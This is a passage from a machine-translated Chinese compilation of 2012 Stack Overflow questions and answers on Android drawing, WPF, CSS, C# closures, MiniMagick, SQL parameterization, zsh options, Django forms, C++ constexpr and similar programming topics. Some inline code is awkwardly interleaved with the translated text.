      c.drawBitmap(my_bitmap, 0.0, 0.0, null);
   }
} 
```

onSizeChanged() 将是初始化位图的合理位置，因为您知道它的大小：

```
@Override
public void onSizeChanged(int w, int h, int oldw, int oldh) {
   my_bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
} 
```

要在 my_bitmap 上绘图，只需使用以下命令创建一个新的 Canvas：

```
Canvas c = new Canvas(my_bitmap); 
```

# .net - 在 WPF 中绘制折线

> ID：11917556
> 
> 赞同：0
> 
> 时间：2012-08-11T20:50:43.450
> 
> 标签：.net, wpf, vb.net

下面的代码是 Microsoft 生成折线的示例。我已经实现了这个，但它不起作用。

我的问题是：使“myPolyline”对象显示的方法是什么？代码的最后一行是`myGrid.Children.Add(myPolyline)`，我不明白哪个对象应该被命名为“myGrid”，也许我的问题的答案与此有关。

```
' Add a Polyline Element
Dim myPolyline As New Polyline()
myPolyline.Stroke = Brushes.SlateGray
myPolyline.StrokeThickness = 2
myPolyline.FillRule = FillRule.EvenOdd
Dim Point4 As New System.Windows.Point(1, 50)
Dim Point5 As New System.Windows.Point(10, 80)
Dim Point6 As New System.Windows.Point(20, 40)
Dim myPointCollection2 As New PointCollection()
myPointCollection2.Add(Point4)
myPointCollection2.Add(Point5)
myPointCollection2.Add(Point6)
myPolyline.Points = myPointCollection2
myGrid.Children.Add(myPolyline) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T23:07:51.873

`myGrid`只是`Grid`添加到应用了 myGrid 名称的 WPF 表单的默认设置：

```
<Grid x:Name="myGrid">
</Grid> 
```

您显示代码的示例从点到示例页面[How to: Draw a Polyline by Using the Polyline Element](http://msdn.microsoft.com/en-us/library/ms747354.aspx)，其中包含指向可下载示例项目的链接，还包含其他形状元素的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-12T00:06:04.883

Winforms 中的一个类似函数是[Graphics.DrawLines](http://msdn.microsoft.com/en-us/library/7ewkcdb3.aspx)方法或[Graphics.DrawPath](http://msdn.microsoft.com/en-us/library/system.drawing.graphics.drawpath)方法，您将在您希望绘制的控件的 Paint 事件中使用它们。

快速示例：

```
Private Sub Panel1_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles Panel1.Paint
    Dim myPen As Pen = New Pen(Brushes.DarkGray, 2)
    Dim myPoints() As Point = New Point() {New Point(1, 50), New Point(10, 80), New Point(20, 40)}
    e.Graphics.DrawLines(myPen, myPoints)
End Sub 
```

和 DrawPath 示例：

```
Private Sub Panel1_Paint(sender As System.Object, e As System.Windows.Forms.PaintEventArgs) Handles Panel1.Paint
    Dim myPen As Pen = New Pen(Brushes.DarkGray, 2)
    Dim path As Drawing2D.GraphicsPath = New Drawing2D.GraphicsPath

    path.AddLine(New Point(1, 50), New Point(10, 80))
    path.AddLine(New Point(10, 80), New Point(20, 40))
    path.CloseFigure()

    e.Graphics.DrawPath(myPen, path)
End Sub 
```

# css - CSS导航透明背景

> ID：11917557
> 
> 赞同：1
> 
> 时间：2012-08-11T20:50:44.087
> 
> 标签：css, navigation, nav

我试图让这个透明的背景工作。当导航下拉时，我希望列表的整个背景都是透明的，悬停不透明。

更新：[这是我的 jsfiddle](http://jsfiddle.net/imakeitpretty/Z8Cu8/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T21:21:26.520

改变：

```
ul#navigation li:hover > a
{
    background:#fff;
    color:#4dbaf2;
} 
```

到：

```
#navigation li a:hover
{
    background:#fff;
    color:#4dbaf2;
} 
```

示例：http: [//jsfiddle.net/Z8Cu8/5/](http://jsfiddle.net/Z8Cu8/5/)

## 更新：

然后您还需要将其添加到您的 CSS 文件中：

```
#navigation li ul li a
{
    background-color:rgba(255,255,255,.5);
} 
```

示例：http: [//jsfiddle.net/Z8Cu8/6/](http://jsfiddle.net/Z8Cu8/6/)

但我不确定这是否是你要求的？

# c# - 如何添加列表中的所有字符串 到文本框？

> ID：11917559
> 
> 赞同：0
> 
> 时间：2012-08-11T20:51:28.590
> 
> 标签：c#

```
private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e) 
{
    BackgroundWorker worker = sender as BackgroundWorker;
    while (true)
    {

        if ((worker.CancellationPending == true))
        {
            e.Cancel = true;
            break;
        }
        else
        {

            string content = downloadContent();
            GetProfileNames(content);
            GetTextFromProfile(content);
            for (int i = 0; i < names.Count; i++)
            {
                 namesAndTexts.Add(names[i] + " " + texts[i]);
            }
            if (InvokeRequired)
            {
                for (int f = 0; f < namesAndTexts.Count -1; f++)
                {
                    BeginInvoke(new Action(() => textBox1.AppendText(namesAndTexts[f])), null);
                }
            }
            reader.Close();
            response.Close();
            Thread.Sleep(1000);
        }
    }
} 
```

我试过这部分：

```
if (InvokeRequired)
{
    for (int f = 0; f < namesAndTexts.Count -1; f++)
    {
        BeginInvoke(new Action(() => textBox1.AppendText(namesAndTexts[f])), null);
    }
} 
```

但它不能很好地继续将列表一遍又一遍地添加到文本框中。我想在文本框中看到它：

> 丹尼尔你好
> 
> 亚龙再见
> 
> 丹尼·古德

而且只有一次。

另一件事是，如果在 For im 没有做`namesAndTexts.Count - 1`但是`namesAndTexts.Count`它抛出错误异常 namesAndTexts[f] 索引不应该小于零但小于列表....

* * *

在这将起作用之后，我需要检查列表是否已更改，并以某种方式在文本框中自动向上推，让我们说用线条将文本框填充到其大小，当它到达底部时开始向上滚动并继续更新新行从底部abnd将旧的从顶部向上推。

我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:57:06.000

替换这些行：

```
for (int f = 0; f < namesAndTexts.Count -1; f++)
{
     BeginInvoke(new Action(() => textBox1.AppendText(namesAndTexts[f])), null);
} 
```

用这些：

```
textBox1.Clear();
namesAndTexts.ForEach(Item=> textBox1.AppendText(Item + Environment.NewLine)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:59:47.060

尝试将 For 循环放在 Action lambda 中。另一种方法是首先使用 Sum LINQ 函数对字符串求和，然后将结果放入文本框中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:00:20.550

似乎您正试图在循环内创建一个闭包，并且当下面的代码实际执行时：

```
textBox1.AppendText(namesAndTexts[f]) 
```

它将使用 的当前值`f`，而不是创建 lambda 时的值。这就是为什么它一遍又一遍地添加最后一个元素，如果你不使用边界检查失败（因为is`namesAndTexts.Count - 1`的当前值）。`f``namesAndTexts.Count`

有关“闭环内循环”问题的更详细说明，另请参阅[此问题。](https://stackoverflow.com/q/271440/520779)避免它的一种方法是复制您的`f`变量：

```
for (int f = 0; f < namesAndTexts.Count; f++)
{
    int fcopy = f;
    BeginInvoke(new Action(() => textBox1.AppendText(namesAndTexts[fcopy])), null);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-11T21:02:17.497

因为这个而重复：

```
 while (true)
        {

               reader.Close();
                response.Close();
                Thread.Sleep(1000);
            }
        }
    } 
```

此外，您可以在此之前执行“textBox1.Clear”：

```
 for (int f = 0; f < namesAndTexts.Count -1; f++)
                        {
                            BeginInvoke(new Action(() => textBox1.AppendText(namesAndTexts[f])), null);
                        } 
```

# ruby-on-rails - Unicode 字符使用 Rmagick 渲染，但不使用 Minimagick

> ID：11917561
> 
> 赞同：0
> 
> 时间：2012-08-11T20:51:40.493
> 
> 标签：ruby-on-rails, ruby-on-rails-3, imagemagick, minimagick

由于 Rmagick 的 Minimagick 的性能优势（以及 Rmagik 即将淘汰的事实），我希望能够在 Minimagick 中执行以下操作。默认情况下，Minimagick 似乎不能很好地处理 unicode 字符，但 Rmagick 完全没有问题（此代码工作正常）：

```
def getimage
      bg = Magick::ImageList.new("#{Rails.root}/app/assets/images/template.png")
      text = Magick::Draw.new
      text.encoding = "Unicode"
      text.text(23,14,"ÿüñCe#43535r(*&^%$#ð")
      text.draw(bg)
   send_data(bg.to_blob, :type => 'image/png', :disposition => 'inline')
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T17:01:04.823

我仍在努力了解**什么**对您有效，什么无效，以及您的实际问题在哪里......

尽管如此，我第一次进入迷雾就是这个。交换以下两行：

```
 text.text(23,14,"ÿüñCe#43535r(*&^%$#ð")
  text.draw(bg) 
```

并让他们阅读：

```
 text.draw(bg)
  text.text(23,14,"ÿüñCe#43535r(*&^%$#ð") 
```

即：***先***画背景，***再***画文字。（Minimagick 很可能按规定的顺序执行绘图语句，因为命令行的行为是相同的——而 Minimagick 只是命令行的包装器......）

# java - 从多个手指获取坐标（Android）

> ID：11917565
> 
> 赞同：0
> 
> 时间：2012-08-11T20:52:24.463
> 
> 标签：java, android

> **可能重复：**
> [指针问题！（安卓）](https://stackoverflow.com/questions/11910223/pointer-problems-android)

我一直在到处寻找一种代码，它只为每个指针获取一个 X 值和一个 Y 值，并且可能为每个指针获取一些不同的布尔变量，以便轻松理解正在发生的事情。

我自己一直在编写代码，但它并没有像我想要的那样工作。它将保存四对不同的 X 和 Y 坐标，但问题是每当一个手指从屏幕上移开时，所有指针（在布尔型 touch[] 中）都会暂时变为假。有谁知道如何使每个指针独立，以便当一根手指从屏幕上移开时，只有布尔数组中的那个值会变为假？

```
public boolean onTouch(View v, MotionEvent event) {
    // TODO Auto-generated method stub
    int action = (event.getAction() & MotionEvent.ACTION_MASK);
    int pointCount = event.getPointerCount();

    for (int i = 0; i < pointCount; i++) {
        int id = event.getPointerId(i);

        if (id < MAX_NUMBER_OF_POINT) {

            xA[id] = (int) event.getX(i);
            yA[id] = (int) event.getY(i);

            if ((action == MotionEvent.ACTION_DOWN)
                    || (action == MotionEvent.ACTION_POINTER_DOWN)
                    || (action == MotionEvent.ACTION_MOVE)) {
                touching[id] = true;
            } else {

                touching[id] = false;
            }
        }
    }

    for (int i2 = 0; i2 < 5; i2++) {
        if (touching[i2] == false) {

            xA[i2] = 0;
            yA[i2] = 0;
        }
    }

    x1 = xA[0];
    x2 = xA[1];
    x3 = xA[2];
    x4 = xA[3];

    y1 = yA[0];
    y2 = yA[1];
    y3 = yA[2];
    y4 = yA[3];

    return true;
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:59:15.617

您只使用一个`action`变量并遍历所有指针，因此它们都是相同的。改用`getActionMasked`with `getActionIndex`。请参阅[MotionEvent Android 开发页面](http://developer.android.com/reference/android/view/MotionEvent.html)。

# mysql - SQL 参数化：这在幕后是如何工作的？

> ID：11917566
> 
> 赞同：3
> 
> 时间：2012-08-11T20:52:35.143
> 
> 标签：mysql, sql, parameterized

SQL 参数化现在是一个热门话题，并且[有充分的理由](http://www.computing.co.uk/ctg/news/2173851/custom-built-web-applications-vulnerable-attack)，但除了体面地转义之外，它真的有什么作用吗？

我可以想象一个参数化引擎只是在将数据插入查询字符串之前确保数据被适当地转义，但这真的是它的全部吗？在连接中做一些不同的事情会更有意义，例如：

```
> Sent data. Formatting: length + space + payload
< Received data
-----
> 69 SELECT * FROM `users` WHERE `username` LIKE ? AND `creation_date` > ?
< Ok. Send parameter 1.
> 4 joe%
< Ok. Send parameter 2.
> 1 0
< Ok. Query result: [...] 
```

这种方式可以简单地消除 SQL 注入的问题，因此您不必通过转义来避免它们。我能想到参数化如何工作的唯一另一种方法是转义参数：

```
// $params would usually be an argument, not in the code like this
$params = ['joe%', 0];

// Escape the values
foreach ($params as $key=>$value)
    $params[$key] = mysql_real_escape_string($value);

// Foreach questionmark in the $query_string (another argument of the function),
// replace it with the escaped value.
$n = 0;
while ($pos = strpos($query_string, "?") !== false && $n < count($params)) {
    // If it's numeric, don't use quotes around it.
    $param = is_numeric($params[$n]) ? $params[$n] : "'" . $params[$n] . "'";
    // Update the query string with the replaced question mark
    $query_string = substr($query_string, 0, $pos) //or $pos-1? It's pseudocode...
                  . $param
                  . substr($query_string, $pos + 1);
    $n++; 
```

如果是后者，我暂时不会将我的站点切换到参数化。我可以看到它没有任何优势，这只是另一个强变量与弱变量类型的讨论。强类型化可能会在编译时捕获更多错误，但它并没有真正使任何难以做到的事情成为可能——与此参数化相同。（如果我错了，请纠正我！）

* * *

更新：

*   我知道这将取决于 SQL 服务器（也取决于客户端，但我假设客户端使用了最好的技术），但我主要考虑的是 MySQL。不过，关于其他数据库的答案也很受欢迎。
*   据我了解答案，参数化确实不仅仅只是转义数据。它实际上是以参数化的方式发送到服务器的，因此变量是分开的，而不是作为单个查询字符串。
*   这也使服务器能够存储和重用具有不同参数的查询，从而提供更好的性能。

我得到了一切吗？我仍然好奇的一件事是 MySQL 是否具有这些功能，以及是否自动完成查询重用（或者如果没有，如何做到这一点）。

另外，请在有人阅读此更新时发表评论。我不确定它是否会影响问题或什么......

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T21:11:13.733

我确信处理命令和参数的方式会因特定的数据库引擎和客户端库而异。

但是，根据使用 SQL Server 的经验，我可以告诉您，使用 ADO.NET 发送命令时会保留参数。它们没有被折叠到声明中。例如，如果您使用 SQL Profiler，您将看到一个远程过程调用，如：

```
exec sp_executesql N'INSERT INTO Test (Col1) VALUES (@p0)',N'@p0 nvarchar(4000)',@p0=N'p1' 
```

请记住，除了防止 SQL 注入之外，参数化还有其他好处。例如，查询引擎有更好的机会重用参数化查询的查询计划，因为语句总是相同的（只是参数值发生了变化）。

*作为对更新的回应：* 查询参数化是如此普遍，我希望 MySQL（以及实际上任何数据库引擎）能够类似地处理它。

根据 MySQL 协议文档，准备好的语句似乎是使用[COM_PREPARE](http://dev.mysql.com/doc/internals/en/com-prepare.html)和[COM_EXECUTE](http://dev.mysql.com/doc/internals/en/execute-packet.html)数据包处理的，它们确实支持二进制格式的单独参数。目前尚不清楚是否将准备所有参数化语句，但看起来未准备的语句是由未提及参数支持的[COM_QUERY处理的。](http://dev.mysql.com/doc/internals/en/com-query.html)

如有疑问：测试。如果您真的想知道通过网络发送的内容，请使用网络协议分析器（如 Wireshark）并查看数据包。

不管它在内部是如何处理的，以及它当前可能或可能不为给定引擎提供的任何优化，都很少（什么都没有？）从不使用参数中获益。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T21:10:17.980

参数化查询作为参数化查询传递给 SQL 实现，参数永远不会连接到查询本身，除非实现决定回退到连接自身。参数化查询避免了转义的需要，并提高了性能，因为查询是通用的，并且查询的编译形式更有可能已经被数据库服务器缓存。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T21:46:38.217

直接的答案是“它以任何方式在特定的实现中实现”。有几十个数据库，几十个访问层，在某些情况下，同一个访问层处理相同代码的方式不止一种。

所以，这里没有一个正确的答案。

一个例子是，如果您将 Npgsql 与不是准备好的语句的查询一起使用，那么它几乎只是正确地转义了事情（尽管在 Postgresql 中转义有一些边缘情况，知道转义的人会错过，而 Npgsql 会全部捕获它们，所以还是有收获的）。使用准备好的语句，它将参数作为准备好的语句参数发送。因此，一种情况允许比另一种情况更多的查询计划重用。

同一框架 (ADO.NET) 的 SQLServer 驱动程序将查询作为对 sp_executesql 的调用传递，从而允许查询计划重用。

除此之外，出于以下几个原因，逃跑的问题仍然值得考虑：

每次都是相同的代码。如果您要逃避自己，那么您要么每次都通过同一段代码这样做（因此使用别人的同一段代码没有任何不利之处），或者您每次都冒着失误的风险时间。

他们也更擅长不逃跑。例如，没有必要遍历数字的字符串表示中的每个字符来查找`'`字符。但不逃避算作不必要的风险，或合理的微观优化。

好吧，“合理的微优化”本身意味着两件事之一。要么它不需要精神上的努力来写或读之后的正确性（在这种情况下你也可以），或者它被频繁地击中以至于微小的节省会加起来，而且很容易完成。

（相关地，编写一个高度优化的转义器也更有意义 - 所涉及的字符串替换是最常见的替换方法至少不如某些语言中的其他方法快的情况，但是只有当方法被调用很多次时优化才有意义）。

如果您有一个包含类型检查参数的库（基于类型使用的格式或通过验证，这两者在此类代码中都很常见），那么这很容易做到，因为这些库旨在大规模使用，这是一个合理的微选。

如果您每次都在考虑 8 参数调用的第 7 个参数是否可能包含`'`字符，那么它不是。

如果您愿意，它们也更容易转换到其他系统。`System.Data.SqlClient`再次查看我上面给出的两个示例，除了创建的类之外，您可以使用与as with几乎相同的代码`Npgsql`，尽管 SQL-Server 和 Postgresql 具有不同的转义规则。对于二进制字符串、日期时间和其他一些共同的数据类型，它们也有完全不同的格式。

另外，我真的不同意将其称为“热门话题”。至少十多年来，它已经达成了公认的共识。

# environment-variables - 如何查看默认 zsh 设置（HISTSIZE、SAVEHIST、...）

> ID：11917567
> 
> 赞同：8
> 
> 时间：2012-08-11T20:52:50.487
> 
> 标签：environment-variables, default, zsh, built-in

如何查看所有 zsh 设置的当前值？

例如，我目前没有设置 HISTSIZE 和 SAVEHIST，所以什么`env | grep HIST`也不`set | grep HIST`显示。那么我怎样才能看到正在使用的默认值呢？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-12T04:00:31.297

除了解析文档或源代码外，没有其他选项可以获取未定义变量的默认值。

`HISTSIZE`并且`SAVEHIST`不是设置，它们是特殊变量。有一种方法可以列出所有变量，但我不知道如何列出那些特殊并用作设置的变量。

为了帮助您列出作为变量实现的参数，有`zsh/parameter`模块（`zmodload zsh/parameter`加载它）。它有一个关联数组`$parameters`，其中键是变量名，值是变量类型描述。两者`HISTSIZE`和`SAVEHIST`出现在那里`integer-special`。`HISTCHARS`在那里显示为`scalar-special`。请注意，尽管`RANDOM`此处显示为`HISTSIZE`: `integer-special`，因此您不能使用它来获取用作选项的特殊变量。但是您始终可以使用`PARAMETERS USED BY THE SHELL`.`man zshparam`

除了解析文档或源代码之外，我不知道有任何选项可以让您确定这些参数的默认值。

```
# setopt | grep hist
nobanghist
extendedhistory
histfcntllock
histignorealldups
histignorespace
histnostore
histreduceblanks
histsavenodups
histverify
incappendhistory 
```

如果您想查看非默认设置：

> 如果没有提供参数，则打印当前设置的所有选项的名称。选择该形式是为了最大限度地减少与当前仿真的默认选项的差异（默认仿真是本机 zsh，如 zshoptions(1) 所示）。默认情况下为仿真打开的选项仅在关闭时显示前缀 no，而其他选项不显示前缀 no 且仅在打开时显示。除了用户从默认状态更改的选项外，任何由 shell 自动激活的选项（例如 SHIN_STDIN 或 INTERACTIVE）都将显示在列表中。格式由选项 KSH_OPTION_PRINT 进一步修改，但是在这种情况下，选择带或不带 no 前缀的选项的基本原理保持不变。

使用它也很有意义：

```
# unsetopt | grep hist
noappendhistory
cshjunkiehistory
histallowclobber
nohistbeep
histexpiredupsfirst
histfindnodups
histignoredups
histlexwords
histnofunctions
nohistsavebycopy
histsubstpattern
sharehistory 
```

> 如果没有提供参数，则打印当前未设置的所有选项的名称。

或者只是按照帮助和使用

```
# setopt kshoptionprint
# setopt | grep hist
noappendhistory       off
nobanghist            on
cshjunkiehistory      off
extendedhistory       on
histallowclobber      off
nohistbeep            off
histexpiredupsfirst   off
histfcntllock         on
histfindnodups        off
histignorealldups     on
histignoredups        off
histignorespace       on
histlexwords          off
histnofunctions       off
histnostore           on
histreduceblanks      on
nohistsavebycopy      off
histsavenodups        on
histsubstpattern      off
histverify            on
incappendhistory      on
sharehistory          off 
```

注意使用该选项时的输出`setopt`和`unsetopt`匹配。`kshoptionprint`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-03-12T19:21:18.063

显示当前值，无论您是否设置了它（在这种情况下它显示默认值）：

```
➜  ~ echo $SAVEHIST
10000
➜  ~ echo $HISTSIZE 
10000 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-24T12:30:45.190

我不知道你......（我的意思是，*[我确实使用`.prezto`](https://github.com/mralexgray/prezto)*），但这是*我*进入时得到的“自动完成” `setopt``TAB`......

[![在此处输入图像描述](../Images/577f93af1edeca9cc648f13ba270f425.png)](https://i.stack.imgur.com/EzSB1.png)

这告诉我有用的东西，比如..

`-- zsh options (set) -- noaliases noautoresume nohashdirs nohistverify nonomatch ...`

和

`-- zsh options (unset) -- allexport cshjunkiehistory hashexecutablesonly kshglob nullglob singlecommand ...`

# python - 如何在 Mac OSX Lion 上安装 libspotify？

> ID：11917568
> 
> 赞同：3
> 
> 时间：2012-08-11T20:52:51.910
> 
> 标签：python, macos, osx-lion, spotify, homebrew

我正在尝试在 Mac OSX Lion 上安装 libspotify。我想在 Python 脚本中使用 spotify api。当我尝试安装 pyspotify 时，它说：

```
running install
running bdist_egg
running egg_info
writing pyspotify.egg-info/PKG-INFO
writing top-level names to pyspotify.egg-info/top_level.txt
writing dependency_links to pyspotify.egg-info/dependency_links.txt
reading manifest file 'pyspotify.egg-info/SOURCES.txt'
reading manifest template 'MANIFEST.in'
writing manifest file 'pyspotify.egg-info/SOURCES.txt'
installing library code to build/bdist.macosx-10.8-intel/egg
running install_lib
running build_py
running build_ext
building 'spotify._spotify' extension
clang -fno-strict-aliasing -fno-common -dynamic -g -Os -pipe -fno-common -fno-strict-aliasing -fwrapv -mno-fused-madd -DENABLE_DTRACE -DMACOSX -DNDEBUG -Wall -Wstrict-prototypes -Wshorten-64-to-32 -DNDEBUG -g -Os -Wall -Wstrict-prototypes -DENABLE_DTRACE -arch i386 -arch x86_64 -pipe -Isrc -I/System/Library/Frameworks/Python.framework/Versions/2.7/include/python2.7 -c src/module.c -o build/temp.macosx-10.8-intel-2.7/src/module.o
clang: warning: argument unused during compilation: '-mno-fused-madd'
src/module.c:20:10: fatal error: 'spotify/api.h' file not found
#include "spotify/api.h"
         ^
1 error generated.
error: command 'clang' failed with exit status 1 
```

我尝试使用 brew 安装 libspotify ...

```
brew install libspotify 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T16:02:32.033

正如您所说，您可以使用 brew 安装它，或者只是将 libspotify.framework 复制到 /Library/Frameworks

现在您应该能够包含以下库：

```
#include <libspotify/api.h> 
```

# ios - dequeueReusableCellWithIdentifier 在 didSelectRowAtIndexPath 方法中返回 nil

> ID：11917575
> 
> 赞同：0
> 
> 时间：2012-08-11T20:53:36.447
> 
> 标签：ios, tableview

我在我的项目中使用 CustomTableCell。我可以看到“dequeueReusableCellWithIdentifier”在“cellForRowAtIndexPath”方法中返回了一个有效的单元格，因为它应该在重新加载表时返回。

在 CustomTableCell 中，我有一些我想重复使用的图像，而无需再次下载它们。然而，每次我在“didSelectRowAtIndexPath”委托方法中使用“dequeueReusableCellWithIdentifier”时得到一个“nil”。

原来的桌子没有被破坏。该表是类对象，我可以看到它与“didSelectRowAtIndexPath”参数中收到的 tableView 相同。

这种行为与我使用 tableview 的项目中的视图控制器一致。

我正在使用ARC。知道有什么问题吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T21:16:41.413

这个问题有点含糊，但我相信您只是想从“didSelectRowAtIndexPath”中访问您的自定义单元格。如果是这种情况，那么您应该使用：

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    CustomTableCell *myCell = (CustomTableCell*)[tableView cellForRowAtIndexPath:indexPath];
} 
```

然后，您可以随意访问自定义单元格的任何部分。

如果你好奇：

“dequeueReusableCellWithIdentifier”用于通过重用“移动”超出可见范围的表格单元格来减少对象分配和释放的数量。即，如果您有一个包含 1000 个单元格的表格，但在任何给定时间只有 10 个是可见的。大约 10 个细胞将被创建并一遍又一遍地重复使用。因此，当调用 dequeueReusableCellWithIdentifier 时，会将其中一个单元格从当前未使用的单元格堆栈中拉出，或者如果堆栈为空，则创建一个。

# javascript - 无法从我发布到的 iframe 获取文件名

> ID：11917577
> 
> 赞同：1
> 
> 时间：2012-08-11T20:53:38.527
> 
> 标签：javascript, jquery

我正在尝试使用 jQuery 和 PHP 上传图像。我知道有很多插件解决方案，但我正在使用它。我可以毫无问题地将文件上传到服务器，但对于我的生活，我无法弄清楚如何获取文件名，以便我可以显示图像。有没有办法从我发布到的 iframe 中获取文件名？这是我正在使用的代码：

**jQuery**

```
$('#file').change(function()
{ 
    var iframe = $('<iframe name="postiframe" id="postiframe" style="display:none" />');
    $("body").append(iframe);
    var form = $('#form');
    form.attr("action", "../hub.php?handler=add_item");
    form.attr("method", "post");
    form.attr("enctype", "multipart/form-data");
    form.attr("encoding", "multipart/form-data");
    form.attr("target", "postiframe");
    form.attr("file", $('#file').val());
    form.submit();
    $("#postiframe").load(function()
    {
        iframeContents=$("#postiframe")[0].contentWindow.document.body.innerHTML;
        console.log('added : '+iframeContents);                     
    });    
}); 
```

上面的代码只输出“添加：”部分。任何帮助是极大的赞赏 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T22:10:31.347

上传完成后，您必须从服务器`echo`/ `print`the`filename`或从服务器（最好是在您发布到 an 时），这样您就可以像在您的问题代码中一样使用 Javascript 获取它。`path``text/HTML``iframe`

```
iframeContents=$("#postiframe")[0].contentWindow.document.body.innerHTML;
console.log('added : '+iframeContents); 
```

您也可以编写一个新的 JS 请求，通过 Ajax 将上传的图像获取到一个新的 PHP（`echo`例如 JSON），但如果您只想获取该表单提交中的上传文件，则不需要它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:36:29.483

**您可以使用window.name**技术将一些字符串数据从 iframe 传递到主窗口。使用的简短示例：

框架：

```
//doing your stuff, when finished store what you need in window.name property
window.name = '{"key1":"mydata1","key2":"mydata2"}'
window.location.href='about:blank'; 
```

主窗口：

```
$(iframe).bind('load',function(){
    //triggered every time iframe's location is changed
    var iframe_data = this.contentWindow.name;
    if(!iframe_data.length) {
      //it's a first time iframe loaded
      return;
     }
    else{
      //iframe location is changed, we're expecting to receive some data
      $(this).unbind('load');
      console.log($.parseJSON(iframe_data));
      //{"key1":"mydata1","key2":"mydata2"}
    }

}) 
```

即使 iframe 放置在另一个来源（域），它也应该可以工作。我没有专门测试这段代码，但它应该可以工作，我从我的一个项目中复制粘贴它

# web-config - Web.config：从 http 重定向到 https

> ID：11917578
> 
> 赞同：0
> 
> 时间：2012-08-11T20:53:44.487
> 
> 标签：web-config

我是 ASP.NET 的新手，我开发了一个网站并将其托管在 GoDaddy 上。是否有可能在网站下有一个文件夹需要 https 才能访问它或它下面的任何文件？换句话说，当从该文件夹加载任何文件时，URL 地址将变为 HTTPS://

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:55:44.580

用 .装饰提供对这些 URL 的访问的控制器`[RequireHttps]`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:57:12.983

看看`http://www.dantor.com/support/misc/web-config-response-redirect.aspx`它有一些很好的例子。我想您可以使用其中之一重定向到 https URL。

# django - 如何引用 Django 的用户模型中的字段？

> ID：11917580
> 
> 赞同：0
> 
> 时间：2012-08-11T20:54:08.253
> 
> 标签：django, django-models, django-forms, django-templates, django-users

我有以下models.py

```
class UserProfile(models.Model):
    user = models.OneToOneField(User)
    url = models.URLField(blank=True)
    address=models.CharField(max_length=60)
    location = models.CharField(max_length=30)
    join_date = models.DateField(auto_now_add=True) 
```

我有以下forms.py

```
class UserForm(ModelForm):
    class Meta:
        model = UserProfile 
```

我有以下views.py

```
def login_temp(request):
    form = UserForm()
    c = RequestContext(request, {
        'form': form,
        })  
    return render_to_response('registration/login.html', c) 
```

在我的模板（login.html）中，如何访问 django 定义的 User 类的字段。我目前正在使用下面的语法。使用这种语法，“地址”输入字段会出现在我的模板中，但“用户名”输入字段不会

```
<form action="/accounts/register/" method="POST">
  <label class="control-label" for="id_address">Address</label>
  {{ form.address }}

  <label class="control-label" for="id_username">Username</label>
  {{ form.username }}
</form> 
```

我试过做`{{ form.user.username }}`，但这也没有用。我究竟做错了什么？如何让用户名字段出现在我的模板中？仅供参考，变量用户名是在用户模型中定义的。User 模型是一个用 Django 预定义的“库”。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:09:17.150

如果要从现有模型实例中加载带有日期的表单，则需要更改此行

```
form = UserForm() 
```

类似于

```
form = UserForm(instance=existing_user_profile) 
```

`existing_user_profile`UserProfile 的现有实例在哪里。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T21:00:18.150

您可以通过反向关系访问用户对象。尝试这个：

```
{{ form.user.username }} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:14:55.517

你在这里混淆了一些事情。您的 UserProfile 模型的实例可以通过`user`属性访问相关的 User 实例，因此您可以这样做`my_profile.user.username`。

但是在这里，您不是在谈论实例，而是在谈论形式。询问您将如何访问相关模型的字段是没有意义的。表单仅具有由该表单实际定义的字段，在您的情况下，您有一个仅包含 UserProfile 模型字段的表单。

如果您想要用户模型的字段，您需要自己将它们添加到表单定义中。但是您需要手动保存它们 - 它们不会包含在自动`form.save()`. 或者，使用包含在单个 HTML 表单元素中的两个单独的模型表单。

# c++ - 如何在 constexpr 函数中有一个临时变量？

> ID：11917582
> 
> 赞同：5
> 
> 时间：2012-08-11T20:54:31.007
> 
> 标签：c++, constexpr

这是我想做的简化版本。

```
constexpr float f(float a, float b){
    constexpr float temp = a+b;
    return temp*temp*temp;
} 
```

在我的版本中，a+b 要复杂得多，所以我不想剪切和粘贴 3 次。使用 3*(a+b) 也不是实际功能的有效解决方案。我试图让问题与语法相关，而不是代数。我可以通过将 a+b 移动到它自己的 constexpr 函数来让它工作，但我宁愿不要用其他无用的函数污染命名空间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-23T13:37:22.903

正如您所发现的，您不能在 constexpr 函数的主体内声明变量，甚至是 constexpr 变量。

通过将其作为参数传递给第二个 constexpr 函数，仍然可以分解出一个通用表达式。对于您在此处给出的示例：

```
constexpr float pow3(float c) {
    return c*c*c;
}

constexpr float f(float a, float b) {
    return pow3(a+b);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T18:01:43.290

